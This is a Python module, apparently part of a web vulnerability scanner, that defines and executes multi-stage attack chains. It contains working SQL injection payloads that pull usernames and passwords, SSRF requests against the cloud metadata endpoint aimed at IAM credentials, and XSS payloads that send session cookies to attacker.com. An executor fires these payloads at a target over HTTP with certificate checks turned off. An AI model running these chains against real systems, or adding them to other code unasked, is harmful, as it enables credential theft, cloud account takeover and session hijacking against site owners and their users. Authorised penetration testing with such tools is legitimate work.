"""Multi-stage attack chain definitions and executor.

Attack chains combine multiple vulnerability classes into logical
sequences that achieve a specific adversarial goal:
  - SQLi → extract credentials → authenticate → pivot
  - SSRF → metadata access → credential extraction → cloud console access
  - XSS → session theft → privilege escalation → data exfiltration
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass, field
from typing import Any

from ...models import RequestSpec, Severity, VulnerabilityV3


@dataclass
class ChainStep:
    """A single step in an attack chain."""
    name: str
    vuln_class: str
    entry_point: str
    payload: str
    expected_result: str
    next_on_success: str = ""
    next_on_failure: str = ""
    fallback_payload: str = ""
    timeout: float = 15.0


@dataclass
class ChainResult:
    """Result of executing an attack chain."""
    success: bool
    steps_completed: int = 0
    total_steps: int = 0
    extracted_data: dict[str, Any] = field(default_factory=dict)
    findings: list[VulnerabilityV3] = field(default_factory=list)
    error: str = ""


# ── Pre-built attack chains ──────────────────────────────────────────

SQLI_TO_AUTH_CHAIN = [
    ChainStep(
        name="Detect SQLi",
        vuln_class="sqli_error",
        entry_point="id",
        payload="' OR '1'='1' -- ",
        expected_result="database error OR bypass",
        next_on_success="extract_users",
        next_on_failure="try_time_based",
    ),
    ChainStep(
        name="Time-based SQLi",
        vuln_class="sqli_time",
        entry_point="id",
        payload="1' AND SLEEP(2)-- ",
        expected_result="delayed response",
        next_on_success="extract_users",
    ),
    ChainStep(
        name="Extract Users",
        vuln_class="sqli_union",
        entry_point="id",
        payload="' UNION SELECT username,password FROM users-- ",
        expected_result="user credentials in response",
        next_on_success="authenticate",
    ),
    ChainStep(
        name="Authenticate",
        vuln_class="auth_bypass",
        entry_point="login",
        payload="{extracted_credentials}",
        expected_result="200 with session token",
    ),
]

SSRF_TO_CLOUD_CHAIN = [
    ChainStep(
        name="Detect SSRF",
        vuln_class="ssrf",
        entry_point="url",
        payload="http://169.254.169.254/latest/meta-data/",
        expected_result="cloud metadata",
        next_on_success="extract_creds",
    ),
    ChainStep(
        name="Extract Cloud Credentials",
        vuln_class="ssrf",
        entry_point="url",
        payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
        expected_result="AWS credentials",
    ),
]

XSS_TO_SESSION_CHAIN = [
    ChainStep(
        name="Detect Reflected XSS",
        vuln_class="xss",
        entry_point="q",
        payload="<script>fetch('https://attacker.com/'+document.cookie)</script>",
        expected_result="payload reflected unencoded",
        next_on_success="steal_session",
    ),
    ChainStep(
        name="Session Theft via Blind XSS",
        vuln_class="xss_dom",
        entry_point="q",
        payload="<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">",
        expected_result="OOB callback received",
    ),
]


class AttackChain:
    """Multi-stage attack chain executor."""

    def __init__(self, steps: list[ChainStep] | None = None) -> None:
        self.steps = steps or []
        self.results: list[ChainResult] = []
        self.extracted: dict[str, Any] = {}

    async def execute(
        self,
        base_spec: RequestSpec,
        http_client: Any = None,
    ) -> ChainResult:
        """Execute the attack chain against a target."""
        total = len(self.steps)
        completed = 0
        findings: list[VulnerabilityV3] = []

        for i, step in enumerate(self.steps):
            try:
                result = await self._execute_step(step, base_spec, http_client)
                completed += 1
                if result.get("data"):
                    self.extracted.update(result["data"])
                if result.get("finding"):
                    findings.append(result["finding"])
            except Exception as exc:
                if step.next_on_failure:
                    continue
                return ChainResult(
                    success=False,
                    steps_completed=completed,
                    total_steps=total,
                    extracted_data=self.extracted,
                    findings=findings,
                    error=f"Step {i} ({step.name}) failed: {exc}",
                )

        return ChainResult(
            success=completed == total,
            steps_completed=completed,
            total_steps=total,
            extracted_data=self.extracted,
            findings=findings,
        )

    async def _execute_step(
        self,
        step: ChainStep,
        spec: RequestSpec,
        client: Any,
    ) -> dict:
        """Execute a single chain step and return results."""
        import time

        # Build the probe request
        from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

        def _inject(url: str, key: str, value: str) -> str:
            p = urlparse(url)
            q = dict(parse_qsl(p.query, keep_blank_values=True))
            q[key] = value
            return urlunparse(p._replace(query=urlencode(q)))

        test_url = _inject(spec.url, step.entry_point, step.payload)
        t0 = time.time()

        if client is None:
            import httpx
            async with httpx.AsyncClient(timeout=step.timeout, verify=False) as c:
                try:
                    r = await c.get(test_url, headers=spec.headers or None)
                    latency = time.time() - t0
                    return {
                        "status": r.status_code,
                        "body": r.text[:3000],
                        "headers": dict(r.headers),
                        "latency": latency,
                        "data": {},
                    }
                except Exception as exc:
                    return {"error": str(exc)}
        else:
            try:
                r = await client.get(test_url, headers=spec.headers or None)
                latency = time.time() - t0
                return {
                    "status": r.status_code,
                    "body": r.text[:3000],
                    "headers": dict(r.headers),
                    "latency": latency,
                    "data": {},
                }
            except Exception as exc:
                return {"error": str(exc)}

    @staticmethod
    def by_name(name: str) -> AttackChain:
        chains = {
            "sqli_to_auth": AttackChain(SQLI_TO_AUTH_CHAIN),
            "ssrf_to_cloud": AttackChain(SSRF_TO_CLOUD_CHAIN),
            "xss_to_session": AttackChain(XSS_TO_SESSION_CHAIN),
        }
        return chains.get(name, AttackChain())

    @staticmethod
    def list_chains() -> list[str]:
        return ["sqli_to_auth", "ssrf_to_cloud", "xss_to_session"]
